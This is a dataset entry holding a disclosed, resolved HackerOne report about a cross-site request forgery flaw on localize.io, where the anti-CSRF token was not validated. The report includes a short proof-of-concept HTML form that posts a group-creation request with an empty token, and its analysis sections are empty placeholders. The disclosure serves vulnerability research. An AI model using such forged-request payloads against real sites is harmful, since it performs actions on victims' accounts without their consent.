---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '8216'
original_report_id: '8216'
title: Group Creation Via CSRF
weakness: Cross-Site Request Forgery (CSRF)
team_handle: localize
created_at: '2014-04-20T17:12:41.764Z'
disclosed_at: '2014-04-21T02:45:56.961Z'
has_bounty: false
visibility: full
substate: resolved
vote_count: 2
tags:
- hackerone
- cross-site-request-forgery-csrf
---

# Group Creation Via CSRF

## Metadata

- HackerOne Report ID: 8216
- Weakness: Cross-Site Request Forgery (CSRF)
- Program: localize
- Disclosed At: 2014-04-21T02:45:56.961Z
- Has Bounty: No
- Visibility: full
- Substate: resolved

## Original Report

Hi Team,

I have found a CSRf vulnerability using which the attacker can create a group on any users account as the anti-csrf token is not getting vlaidated on the server-side. 


Group Creation Via CSRF Code:

<html>
  <body>
    <form action="http://www.localize.io/pages/create_project/9k" method="POST">
      <input type="hidden" name="CSRFToken" value="" />
      <input type="hidden" name="addGroup[name]" value="test" />
      <input type="submit" value="Submit form" />
    </form>
  </body>
</html>

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
